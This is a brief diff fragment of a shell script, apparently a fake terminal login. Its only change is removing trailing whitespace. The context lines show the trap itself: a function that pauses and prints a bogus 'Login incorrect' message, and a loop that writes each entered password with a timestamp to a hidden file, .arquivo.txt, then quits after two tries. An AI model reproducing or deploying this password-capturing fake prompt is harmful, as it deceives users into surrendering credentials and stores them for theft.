@@ -15,4 +15,4 @@ incorreto(){ sleep 3 ; echo ; echo "Login incorrect" ; }
 			echo "$(date)>> $PASSW" >> .arquivo.txt
 		  count=$(($count+1)) 
 	    [[ $count == "2" ]] && break
-done  
+done
